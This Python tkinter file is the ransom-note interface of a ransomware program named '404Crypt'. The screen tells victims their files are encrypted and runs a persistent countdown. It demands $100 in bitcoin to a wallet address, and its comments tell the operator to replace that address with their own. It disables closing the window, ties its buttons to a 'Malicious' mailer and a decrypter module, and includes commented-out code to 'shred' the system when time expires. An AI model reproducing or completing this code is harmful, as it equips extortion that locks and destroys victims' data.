import tkinter as tk
import datetime
import webbrowser
from functools import lru_cache


class Note(tk.Tk):
    @lru_cache(4048)
    def __init__(self):
        tk.Tk.__init__(self)

        # Obj For Emailing Attacker
        from Encrypt import Malicious
        self.email = Malicious() # Mailing Purposes
        self.browser = webbrowser

        # Timing Lines
        self.current_time = datetime.datetime.now()
        self.due_hour = 24.017  # 0.016  # This is the Time You Give your Victim Before Shredding their System

        # Calculating Optimal Time [ Time when Count down Will Stop]
        self.until = (datetime.timedelta(seconds=self.seconds_counter) + self.current_time)
        self.until = str(self.until).split(".")[0]

        # Gui
        self.title("404Crypt Ransomware")
        self.configure(bg='green')
        self.geometry("960x630")
        # Wallet Address
        self.bitcoin_address = "0X239dj023r0ff3203j0239r023492343"  # Change This To Your Wallet Address
        # self.email = "decryptfiles4@gmail.com"
        # Anti-Close Window
        self.geometry("900x600")
        self.protocol("WM_DELETE_WINDOW", self.disable_close)
        self.overrideredirect(False)  # If Enabled Disables Control Buttons
        # Top Bar
        self.top_bar = tk.Frame(self, height=-1, bg="blue")
        self.top_bar.pack(side=tk.TOP, fill=tk.BOTH)

        self.tb_label = tk.Label(master=self.top_bar, text="YOUR FILES ARE ENCRYPTED", bg='grey', fg="blue", highlightthickness=1)
        self.tb_label.config(font=("", 35))
        self.tb_label.pack(side=tk.TOP, fill=tk.BOTH)
        self.leftframe()
        self.right_frame()

    def disable_close(self):
        pass

    def leftframe(self):
        #  left Frame for Timing and Contacting
        self.left_frame = tk.Frame(master=self, height=200, width=280, bg="red", highlightbackground='black',highlightthickness=1)
        self.left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        self.rf_note(text="\nYour Files Will Be Lost On", color="yellow", size=10)
        self.rf_note(text="\n%s" %self.until, color="white", size=14)  # Due Time indicator
        self.rf_note(text="\n\n\nTime Left\n", color="yellow", size=10)

        # Handling Count Down
        self.timecount = tk.Label(master=self.left_frame, bg="red", fg="black", justify=tk.CENTER, anchor=tk.NW)
        self.timecount.config(font=("", 32, "bold"))
        self.timecount.pack(side=tk.TOP)
        # self.countdown(self.seconds_left)
        self.countdown(remaining=self.seconds_counter)
        # Button
        frame = tk.Frame(self.left_frame,height=100, width=100, bg="red", highlightbackground='white',highlightthickness=2)
        frame.pack(side=tk.BOTTOM, fill=tk.BOTH, expand=True)

        # self.button(text="Contact | Us", frame=frame)
        self.button(text="", frame=frame, action=self.email.send_mail())

        # Email Us Button
        email_us = tk.Button(frame, text="Email | Us?", justify=tk.LEFT, cursor="hand2")
        email_us.bind('<Button-1>', lambda event: self.email.send_mail())
        email_us.pack(side=tk.BOTTOM, padx=10, pady=10)

        # Contact us
        contact = tk.Button(frame, text="Need Help ?", justify=tk.LEFT, cursor="hand2")
        contact.bind('<Button-1>', lambda event: self.email.send_mail())
        contact.pack(side=tk.BOTTOM, padx=10, pady=10)
        # Buy
        how_to_buy = tk.Button(frame, text="How to Buy BTC?", justify=tk.LEFT, cursor="hand2")
        how_to_buy.bind('<Button-1>', lambda event: self.browser.open_new_tab(url='https://bitcoin.org/en/buy'))
        how_to_buy.pack(side=tk.BOTTOM, padx=10, pady=10)

        # What's BitCoin Button
        what_btc = tk.Button(frame, text="What's BitCoin?", justify=tk.LEFT, cursor="hand2")
        what_btc.bind('<Button-1>', lambda event: self.browser.open_new_tab(url='https://bitcoin.org'))
        what_btc.pack(side=tk.BOTTOM, padx=10, pady=10)

    @staticmethod
    def clicked():
        print("Button Clicked")

    def countdown(self, remaining=None):
        if remaining is not None:

            if remaining <= 0:
                self.timecount.configure(text="Time is UP!")
                # Shreade System Lines if Time Runs Out
                #from Encrypt import Malicious
                #shreader = Malicious()
                #shreader.shred_system()
                #self.timecount.configure(text="We Told You!")
            else:
                text = "%s" % str(datetime.timedelta(seconds=remaining)).split(".")[0]
                self.timecount.configure(text=text)
                self.after(1000, self.countdown, remaining - 1)
        else:
            pass

    @property
    def seconds_counter(self):
        try:
            # Attempt to read the end time from the file
            with open("timer.txt", 'r') as secs:
                end_time_str = secs.readline().strip()
                if end_time_str:
                    due_date = datetime.datetime.fromisoformat(end_time_str)
                else:
                    raise ValueError("Empty file")

        except (FileNotFoundError, ValueError):
            due_date = self.current_time + datetime.timedelta(hours=self.due_hour)

            with open("timer.txt", 'w') as timing:
                timing.write(due_date.isoformat())

        seconds_left = (due_date - self.current_time).total_seconds()

        return seconds_left

    def rf_note(self, text=None, color=None, size=None):  # LEft frame
        note = tk.Label(master=self.left_frame, bg="red", fg=color, justify=tk.CENTER, anchor=tk.NW)
        note.config(text=text, font=("", size, "bold"))
        return note.pack(side=tk.TOP)

    def button(self, text=None, frame=None, action=None):
        btn = tk.Button(frame, text=f"{text}", justify=tk.LEFT, cursor="hand2", bg="red", fg="red", height=0, width=0, border=None)
        btn.bind('<Button-2>', lambda event:action)
        return btn.pack(side=tk.BOTTOM, padx=10, pady=10)

    def right_frame(self):
        # Right Frame for all
        self.rightframe = tk.Frame(master=self, height=200, width=100, bg="white", highlightbackground='black', highlightthickness=1)
        self.rightframe.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

        #  Warning Text Appears Here
        self.warning_frame = tk.Frame(self.rightframe, height=200, width=100, bg="black",highlightbackground="white", highlightthickness=1)
        self.warning_frame.pack(side=tk.TOP, fill=tk.BOTH, expand=True)

        self.warning_text(text="WHAT HAPPENED TO MY COMPUTER?", color='red', size=12)
        self.warning_text(text="\nYOUR FILES ARE ENCRYPTED WITH A MILITARY GRADE ENCRYPTION SERVICE", color="white", size=9)
        self.warning_text(text="\nCAN I RECOVER MY FILES?", color="red", size=12)

        text = f"""
No way You can Restore Your Files without the Special Key

The key is Available But Not Free, You Need To Purchase it if You want your Files

To purchase the Key & Restore Your System Data, Follow The Steps Below

1.  Click Mail US or Run the file Email_Me.py to communicate with us
"""
        text2 = """
2. Send $100 worthy of BitCoins to the Given Address Address Below"
"""
        text3 = f"""
3. Email {self.email.mail} with Proof of sending the Amount"""
        text4 = """
4. After Completion you will Receive a Key Copy File
"""
        text5 = """
5. Place the key file "symmetric.pem" on the "DESKTOP" then, Click DECRYPT
"""

        warning = """Don't attempt to decrypt your files with any software
It May cost you more to unlock your files.
"""

        self.warning_text(text=text, color="white", size=8)
        self.warning_text(text=text2, color="yellow", size=9)
        self.warning_text(text=text3, color="yellow", size=9)
        self.warning_text(text=text4, color="white", size=9)
        self.warning_text(text=text5, color="red", size=9)
        self.warning_text(text="WARNING", color="RED", size=14)
        self.warning_text(text=warning, color="red", size=8)
        # self.warning_text(text="FAILURE TO COMPLY WE SHRED YOUR SYSTEM", color="yellow", size=11)
        self.warning_text(text="SEND $100 Worth OF BTC To This Address:", color="yellow", size=11)

        self.text_field = tk.Text(self.rightframe, width=40, height=1)
        self.text_field.insert(tk.END, "BTC: "+self.bitcoin_address)
        self.text_field.config(state=tk.DISABLED)
        self.text_field.pack(pady=0, padx=10, side=tk.LEFT)

        # Copy Button
        copy = tk.Button(self.rightframe, text="Copy", justify=tk.CENTER, cursor="hand2")
        copy.bind('<Button-1>', lambda event: self.copy_text())
        copy.pack(side=tk.LEFT, padx=1, pady=0, expand=True)

        # Decrypt Button These have to be modified to link to os detection file
        from Decrypt import Decrypter
        file_decrypt = Decrypter()

        decrypt = tk.Button(self.rightframe, text="DECRYPT", justify=tk.CENTER, cursor="hand2", borderwidth=10, bg="red", fg="white", highlightthickness=2)
        decrypt.bind('<Button-1>', lambda event: file_decrypt.crypt())
        decrypt.pack(side=tk.BOTTOM, padx=10, pady=0, expand=True)

    def copy_text(self):
        self.clipboard_clear()
        wallet_address = self.bitcoin_address
        self.clipboard_append(wallet_address)

    def warning_text(self, text=None, color=None, size=None):
        note = tk.Label(master=self.warning_frame, bg="black", fg=f"{color}", justify=tk.LEFT, anchor=tk.NW)
        note.config(text=text, font=("", size, "bold"))
        return note.pack(side=tk.TOP)


@lru_cache(4048)
def main():
    apk = Note()
    apk.mainloop()


if __name__ == "__main__":
    main()

